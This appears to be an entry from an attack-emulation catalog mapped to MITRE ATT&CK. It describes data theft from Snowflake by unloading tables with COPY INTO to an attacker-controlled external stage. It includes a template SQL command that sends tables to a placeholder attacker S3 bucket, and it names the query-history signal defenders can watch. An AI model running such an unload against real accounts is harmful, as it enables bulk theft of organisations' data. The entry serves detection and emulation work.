---
id: snowflake-exfil-stage
title: Snowflake data exfil via COPY INTO external stage
section: Snowflake / data cloud
phase: Exfiltration
attack:
  tactic: TA0010
  techniques: [T1567.002]
platform: [snowflake]
source: Snowflake data-theft campaign (unload to external stage)
pair: snowflake-exfil-audit
---

The 2024-campaign move: with a compromised login (often MFA-less), `COPY INTO` an
attacker-controlled external stage / cloud bucket and walk off with whole tables at
warehouse speed — no dump tooling, just a query. Snowflake records it in
`ACCOUNT_USAGE.QUERY_HISTORY` with `QUERY_TYPE = UNLOAD`. (Data cloud — no on-host
target, so no slots.)

```sql
-- unload sensitive tables to an attacker-controlled external location
COPY INTO 's3://<attacker-bucket>/dump/' FROM <db>.<schema>.<table>
  STORAGE_INTEGRATION = <int> FILE_FORMAT = (TYPE = CSV) HEADER = TRUE;
```
